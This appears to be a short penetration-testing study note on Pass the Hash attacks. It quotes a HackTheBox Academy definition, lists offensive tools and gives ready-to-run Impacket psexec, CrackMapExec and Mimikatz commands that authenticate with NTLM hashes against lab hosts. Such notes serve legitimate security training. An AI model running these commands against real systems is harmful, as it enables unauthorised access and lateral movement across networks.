# Pass the Hash

> A Pass the Hash (PtH) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn't need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.
>
> Source: [HackTheBox Academy](https://academy.hackthebox.com/module/147/section/1638)

Several tools can be used for this attack:

- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Impacket](https://github.com/fortra/impacket)
- [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec)
- [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [evil-winrm](https://github.com/Hackplayers/evil-winrm)

## External Resources

- [Pass the Hash by Hackndo](https://en.hackndo.com/pass-the-hash/)
- [Pass the Hash by HackTricks](https://book.hacktricks.xyz/windows-hardening/ntlm#pass-the-hash)

## Examples

```bash title="Impacket PsExec Example"
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

```bash title="CrackMapExec Example"
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

```batch title="Mimikatz Example"
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
